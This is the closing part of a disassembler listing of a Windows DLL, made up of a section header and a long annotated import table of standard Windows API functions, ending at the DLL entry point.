dword_418068	dd ?			; DATA XREF: sub_4154A8+35r
					; CODE:00415CF6o
dword_41806C	dd ?			; DATA XREF: sub_41557C+48r
					; CODE:00415CDBo
dword_418070	dd ?			; DATA XREF: sub_41536C+21r
					; CODE:00415CB2o
		align 1000h
BSS		ends

; Section 4. (virtual address 00019000)
; Virtual size			: 00000B70 (   2928.)
; Section size in file		: 00000C00 (   3072.)
; Offset to raw	data for section: 00016200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Externs
; _idata


;
; Imports from kernel32.dll
;
; void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn __imp_DeleteCriticalSection:dword	; DATA XREF: DeleteCriticalSectionr
; void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn __imp_LeaveCriticalSection:dword ; DATA XREF: LeaveCriticalSectionr
; void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn __imp_EnterCriticalSection:dword ; DATA XREF: EnterCriticalSectionr
; void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn __imp_InitializeCriticalSection:dword
					; DATA XREF: InitializeCriticalSectionr
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn __imp_VirtualFree:dword ;	DATA XREF: VirtualFreer
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn __imp_VirtualAlloc:dword ; DATA XREF: VirtualAllocr
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
		extrn __imp_LocalFree:dword ; DATA XREF: LocalFreer
; HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes)
		extrn __imp_LocalAlloc:dword ; DATA XREF: LocalAllocr
; DWORD	__stdcall GetVersion()
		extrn __imp_GetVersion:dword ; DATA XREF: GetVersionr
; DWORD	__stdcall GetCurrentThreadId()
		extrn __imp_GetCurrentThreadId:dword ; DATA XREF: GetCurrentThreadIdr
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn __imp_WideCharToMultiByte:dword ;	DATA XREF: WideCharToMultiByter
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn __imp_MultiByteToWideChar:dword ;	DATA XREF: MultiByteToWideCharr
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn __imp_lstrlenA:dword ; DATA XREF:	lstrlenAr
; LPSTR	__stdcall lstrcpynA(LPSTR lpString1, LPCSTR lpString2, int iMaxLength)
		extrn __imp_lstrcpynA:dword ; DATA XREF: lstrcpynAr
; HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName, HANDLE	hFile, DWORD dwFlags)
		extrn __imp_LoadLibraryExA:dword ; DATA	XREF: LoadLibraryExAr
; LCID __stdcall GetThreadLocale()
		extrn __imp_GetThreadLocale:dword ; DATA XREF: GetThreadLocaler
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn __imp_GetStartupInfoA:dword ; DATA XREF: GetStartupInfoAr
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn __imp_GetProcAddress:dword ; DATA	XREF: GetProcAddressr
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn __imp_GetModuleHandleA:dword ; DATA XREF:	GetModuleHandleAr
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn __imp_GetModuleFileNameA:dword ; DATA XREF: GetModuleFileNameAr
; int __stdcall	GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
		extrn __imp_GetLocaleInfoA:dword ; DATA	XREF: GetLocaleInfoAr
; LPSTR	__stdcall GetCommandLineA()
		extrn __imp_GetCommandLineA:dword ; DATA XREF: GetCommandLineAr
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn __imp_FreeLibrary:dword ;	DATA XREF: FreeLibraryr
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA	lpFindFileData)
		extrn __imp_FindFirstFileA:dword ; DATA	XREF: FindFirstFileAr
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn __imp_FindClose:dword ; DATA XREF: FindCloser
; void __stdcall ExitProcess(UINT uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn __imp_WriteFile:dword ; DATA XREF: WriteFiler
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn __imp_UnhandledExceptionFilter:dword
					; DATA XREF: UnhandledExceptionFilterr
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)
		extrn __imp_RaiseException:dword ; DATA	XREF: RaiseExceptionr
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn __imp_GetStdHandle:dword ; DATA XREF: GetStdHandler

;
; Imports from user32.dll
;
; int __stdcall	GetKeyboardType(int nTypeFlag)
		extrn __imp_GetKeyboardType:dword ; DATA XREF: GetKeyboardTyper
; int __stdcall	LoadStringA(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax)
		extrn __imp_LoadStringA:dword ;	DATA XREF: LoadStringAr
; int __stdcall	MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption,	UINT uType)
		extrn __imp_MessageBoxA:dword ;	DATA XREF: MessageBoxAr
; LPSTR	__stdcall CharNextA(LPCSTR lpsz)
		extrn __imp_CharNextA:dword ; DATA XREF: CharNextAr

;
; Imports from advapi32.dll
;
; LSTATUS __stdcall RegQueryValueExA(HKEY hKey,	LPCSTR lpValueName, LPDWORD lpReserved,	LPDWORD	lpType,	LPBYTE lpData, LPDWORD lpcbData)
		extrn __imp_RegQueryValueExA:dword ; DATA XREF:	RegQueryValueExAr
; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY	phkResult)
		extrn __imp_RegOpenKeyExA:dword	; DATA XREF: RegOpenKeyExAr
; LSTATUS __stdcall RegCloseKey(HKEY hKey)
		extrn __imp_RegCloseKey:dword ;	DATA XREF: RegCloseKeyr

;
; Imports from oleaut32.dll
;
; void __stdcall SysFreeString(BSTR bstrString)
		extrn __imp_SysFreeString:dword	; DATA XREF: SysFreeStringr
; INT __stdcall	SysReAllocStringLen(BSTR *pbstr, const OLECHAR *psz, unsigned int len)
		extrn __imp_SysReAllocStringLen:dword ;	DATA XREF: SysReAllocStringLenr

;
; Imports from kernel32.dll
;
; BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)
		extrn __imp_TlsSetValue:dword ;	DATA XREF: TlsSetValuer
; LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)
		extrn __imp_TlsGetValue:dword ;	DATA XREF: TlsGetValuer
; BOOL __stdcall TlsFree(DWORD dwTlsIndex)
		extrn __imp_TlsFree:dword ; DATA XREF: TlsFreer
; DWORD	__stdcall TlsAlloc()
		extrn __imp_TlsAlloc:dword ; DATA XREF:	TlsAllocr
; HLOCAL __stdcall LocalFree_0(HLOCAL hMem)
		extrn __imp_LocalFree_0:dword ;	DATA XREF: LocalFree_0r
; HLOCAL __stdcall LocalAlloc_0(UINT uFlags, SIZE_T uBytes)
		extrn __imp_LocalAlloc_0:dword ; DATA XREF: LocalAlloc_0r

;
; Imports from advapi32.dll
;
; BOOL __stdcall SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR	pSecurityDescriptor, BOOL bDaclPresent,	PACL pDacl, BOOL bDaclDefaulted)
		extrn __imp_SetSecurityDescriptorDacl:dword
					; DATA XREF: SetSecurityDescriptorDaclr
; BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle,	DWORD DesiredAccess, PHANDLE TokenHandle)
		extrn __imp_OpenProcessToken:dword ; DATA XREF:	OpenProcessTokenr
; BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid)
		extrn __imp_LookupPrivilegeValueA:dword	; DATA XREF: LookupPrivilegeValueAr
; BOOL __stdcall InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor,	DWORD dwRevision)
		extrn __imp_InitializeSecurityDescriptor:dword
					; DATA XREF: InitializeSecurityDescriptorr
; BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,	LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength)
		extrn __imp_GetTokenInformation:dword ;	DATA XREF: GetTokenInformationr
; DWORD	__stdcall GetLengthSid(PSID pSid)
		extrn __imp_GetLengthSid:dword ; DATA XREF: GetLengthSidr
; BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL	DisableAllPrivileges, PTOKEN_PRIVILEGES	NewState, DWORD	BufferLength, PTOKEN_PRIVILEGES	PreviousState, PDWORD ReturnLength)
		extrn __imp_AdjustTokenPrivileges:dword	; DATA XREF: AdjustTokenPrivilegesr

;
; Imports from kernel32.dll
;
; int __stdcall	lstrlenW(LPCWSTR lpString)
		extrn __imp_lstrlenW:dword ; DATA XREF:	lstrlenWr
; int __stdcall	lstrcmpiW(LPCWSTR lpString1, LPCWSTR lpString2)
		extrn __imp_lstrcmpiW:dword ; DATA XREF: lstrcmpiWr
; int __stdcall	lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2)
		extrn __imp_lstrcmpiA:dword ; DATA XREF: lstrcmpiAr
; BOOL __stdcall WriteFile_0(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
		extrn __imp_WriteFile_0:dword ;	DATA XREF: WriteFile_0r
; DWORD	__stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
		extrn __imp_WaitForSingleObject:dword ;	DATA XREF: WaitForSingleObjectr
; DWORD	__stdcall WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles,	BOOL bWaitAll, DWORD dwMilliseconds)
		extrn __imp_WaitForMultipleObjects:dword
					; DATA XREF: WaitForMultipleObjectsr
; SIZE_T __stdcall VirtualQuery(LPCVOID	lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
		extrn __imp_VirtualQuery:dword ; DATA XREF: VirtualQueryr
; BOOL __stdcall VirtualFree_0(LPVOID lpAddress, SIZE_T	dwSize,	DWORD dwFreeType)
		extrn __imp_VirtualFree_0:dword	; DATA XREF: VirtualFree_0r
; LPVOID __stdcall VirtualAlloc_0(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn __imp_VirtualAlloc_0:dword ; DATA	XREF: VirtualAlloc_0r
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
		extrn __imp_UnmapViewOfFile:dword ; DATA XREF: UnmapViewOfFiler
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn __imp_Sleep:dword	; DATA XREF: Sleepr
; BOOL __stdcall SetThreadPriority(HANDLE hThread, int nPriority)
		extrn __imp_SetThreadPriority:dword ; DATA XREF: SetThreadPriorityr
; void __stdcall SetLastError(DWORD dwErrCode)
		extrn __imp_SetLastError:dword ; DATA XREF: SetLastErrorr
; BOOL __stdcall SetEvent(HANDLE hEvent)
		extrn __imp_SetEvent:dword ; DATA XREF:	SetEventr
; BOOL __stdcall ReleaseMutex(HANDLE hMutex)
		extrn __imp_ReleaseMutex:dword ; DATA XREF: ReleaseMutexr
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
		extrn __imp_OpenProcess:dword ;	DATA XREF: OpenProcessr
; HANDLE __stdcall OpenMutexW(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName)
		extrn __imp_OpenMutexW:dword ; DATA XREF: OpenMutexWr
; HANDLE __stdcall OpenMutexA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
		extrn __imp_OpenMutexA:dword ; DATA XREF: OpenMutexAr
; HANDLE __stdcall OpenFileMappingW(DWORD dwDesiredAccess, BOOL	bInheritHandle,	LPCWSTR	lpName)
		extrn __imp_OpenFileMappingW:dword ; DATA XREF:	OpenFileMappingWr
; HANDLE __stdcall OpenFileMappingA(DWORD dwDesiredAccess, BOOL	bInheritHandle,	LPCSTR lpName)
		extrn __imp_OpenFileMappingA:dword ; DATA XREF:	OpenFileMappingAr
					; OpenFileMappingA_0r
; HANDLE __stdcall OpenEventA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
		extrn __imp_OpenEventA:dword ; DATA XREF: OpenEventAr
; LPVOID __stdcall MapViewOfFile(HANDLE	hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
		extrn __imp_MapViewOfFile:dword	; DATA XREF: MapViewOfFiler
; HLOCAL __stdcall LocalFree_1(HLOCAL hMem)
		extrn __imp_LocalFree_1:dword ;	DATA XREF: LocalFree_1r
; HLOCAL __stdcall LocalAlloc_1(UINT uFlags, SIZE_T uBytes)
		extrn __imp_LocalAlloc_1:dword ; DATA XREF: LocalAlloc_1r
; HMODULE __stdcall LoadLibraryExA_0(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags)
		extrn __imp_LoadLibraryExA_0:dword ; DATA XREF:	LoadLibraryExA_0r
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
		extrn __imp_LoadLibraryW:dword ; DATA XREF: LoadLibraryWr
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn __imp_LoadLibraryA:dword ; DATA XREF: LoadLibraryAr
; void __stdcall LeaveCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection)
		extrn __imp_LeaveCriticalSection_0:dword
					; DATA XREF: LeaveCriticalSection_0r
; BOOL __stdcall IsBadReadPtr(const void *lp, UINT_PTR ucb)
		extrn __imp_IsBadReadPtr:dword ; DATA XREF: IsBadReadPtrr
; void __stdcall InitializeCriticalSection_0(LPCRITICAL_SECTION	lpCriticalSection)
		extrn __imp_InitializeCriticalSection_0:dword
					; DATA XREF: InitializeCriticalSection_0r
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA	lpVersionInformation)
		extrn __imp_GetVersionExA:dword	; DATA XREF: GetVersionExAr
; DWORD	__stdcall GetVersion_0()
		extrn __imp_GetVersion_0:dword ; DATA XREF: GetVersion_0r
; LCID __stdcall GetThreadLocale_0()
		extrn __imp_GetThreadLocale_0:dword ; DATA XREF: GetThreadLocale_0r
; BOOL __stdcall GetStringTypeExA(LCID Locale, DWORD dwInfoType, LPCSTR	lpSrcStr, int cchSrc, LPWORD lpCharType)
		extrn __imp_GetStringTypeExA:dword ; DATA XREF:	GetStringTypeExAr
; HANDLE __stdcall GetStdHandle_0(DWORD	nStdHandle)
		extrn __imp_GetStdHandle_0:dword ; DATA	XREF: GetStdHandle_0r
; FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName)
		extrn __imp_GetProcAddress_0:dword ; DATA XREF:	GetProcAddress_0r
; HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)
		extrn __imp_GetModuleHandleW:dword ; DATA XREF:	GetModuleHandleWr
; HMODULE __stdcall GetModuleHandleA_0(LPCSTR lpModuleName)
		extrn __imp_GetModuleHandleA_0:dword ; DATA XREF: GetModuleHandleA_0r
					; GetModuleHandleA_0_0r
; DWORD	__stdcall GetModuleFileNameW(HMODULE hModule, LPWCH lpFilename,	DWORD nSize)
		extrn __imp_GetModuleFileNameW:dword ; DATA XREF: GetModuleFileNameWr
; DWORD	__stdcall GetModuleFileNameA_0(HMODULE hModule,	LPCH lpFilename, DWORD nSize)
		extrn __imp_GetModuleFileNameA_0:dword ; DATA XREF: GetModuleFileNameA_0r
					; GetModuleFileNameA_0_0r
; int __stdcall	GetLocaleInfoA_0(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
		extrn __imp_GetLocaleInfoA_0:dword ; DATA XREF:	GetLocaleInfoA_0r
; DWORD	__stdcall GetLastError()
		extrn __imp_GetLastError:dword ; DATA XREF: GetLastErrorr
; BOOL __stdcall GetDiskFreeSpaceA(LPCSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters)
		extrn __imp_GetDiskFreeSpaceA:dword ; DATA XREF: GetDiskFreeSpaceAr
; DWORD	__stdcall GetCurrentThreadId_0()
		extrn __imp_GetCurrentThreadId_0:dword ; DATA XREF: GetCurrentThreadId_0r
; HANDLE __stdcall GetCurrentThread()
		extrn __imp_GetCurrentThread:dword ; DATA XREF:	GetCurrentThreadr
; DWORD	__stdcall GetCurrentProcessId()
		extrn __imp_GetCurrentProcessId:dword ;	DATA XREF: GetCurrentProcessIdr
; HANDLE __stdcall GetCurrentProcess()
		extrn __imp_GetCurrentProcess:dword ; DATA XREF: GetCurrentProcessr
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn __imp_GetCPInfo:dword ; DATA XREF: GetCPInfor
; UINT __stdcall GetACP()
		extrn __imp_GetACP:dword ; DATA	XREF: GetACPr
; BOOL __stdcall FreeLibrary_0(HMODULE hLibModule)
		extrn __imp_FreeLibrary_0:dword	; DATA XREF: FreeLibrary_0r
; DWORD	__stdcall FormatMessageA(DWORD dwFlags,	LPCVOID	lpSource, DWORD	dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments)
		extrn __imp_FormatMessageA:dword ; DATA	XREF: FormatMessageAr
; BOOL __stdcall EnumCalendarInfoA(CALINFO_ENUMPROCA lpCalInfoEnumProc,	LCID Locale, CALID Calendar, CALTYPE CalType)
		extrn __imp_EnumCalendarInfoA:dword ; DATA XREF: EnumCalendarInfoAr
; void __stdcall EnterCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection)
		extrn __imp_EnterCriticalSection_0:dword
					; DATA XREF: EnterCriticalSection_0r
; BOOL __stdcall DuplicateHandle(HANDLE	hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD	dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
		extrn __imp_DuplicateHandle:dword ; DATA XREF: DuplicateHandler
; HANDLE __stdcall CreateMutexW(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName)
		extrn __imp_CreateMutexW:dword ; DATA XREF: CreateMutexWr
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName)
		extrn __imp_CreateMutexA:dword ; DATA XREF: CreateMutexAr
					; CreateMutexA_0r
; HANDLE __stdcall CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName)
		extrn __imp_CreateFileMappingW:dword ; DATA XREF: CreateFileMappingWr
; HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
		extrn __imp_CreateFileMappingA:dword ; DATA XREF: CreateFileMappingAr
					; CreateFileMappingA_0r
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
		extrn __imp_CreateFileA:dword ;	DATA XREF: CreateFileAr
; HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState,	LPCSTR lpName)
		extrn __imp_CreateEventA:dword ; DATA XREF: CreateEventAr
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn __imp_CloseHandle:dword ;	DATA XREF: CloseHandler

;
; Imports from user32.dll
;
; int __stdcall	MessageBoxA_0(HWND hWnd, LPCSTR	lpText,	LPCSTR lpCaption, UINT uType)
		extrn __imp_MessageBoxA_0:dword	; DATA XREF: MessageBoxA_0r
; int __stdcall	LoadStringA_0(HINSTANCE	hInstance, UINT	uID, LPSTR lpBuffer, int cchBufferMax)
		extrn __imp_LoadStringA_0:dword	; DATA XREF: LoadStringA_0r
; int __stdcall	GetSystemMetrics(int nIndex)
		extrn __imp_GetSystemMetrics:dword ; DATA XREF:	GetSystemMetricsr
; LPSTR	__stdcall CharNextA_0(LPCSTR lpsz)
		extrn __imp_CharNextA_0:dword ;	DATA XREF: CharNextA_0r
; BOOL __stdcall CharToOemA(LPCSTR pSrc, LPSTR pDst)
		extrn __imp_CharToOemA:dword ; DATA XREF: CharToOemAr

;
; Imports from advapi32.dll
;
; BOOL __stdcall GetKernelObjectSecurity(HANDLE	Handle,	SECURITY_INFORMATION RequestedInformation, PSECURITY_DESCRIPTOR	pSecurityDescriptor, DWORD nLength, LPDWORD lpnLengthNeeded)
		extrn __imp_GetKernelObjectSecurity:dword
					; DATA XREF: GetKernelObjectSecurityr
		extrn byte_4192C8:byte:0D38h


		end DllEntryPoint
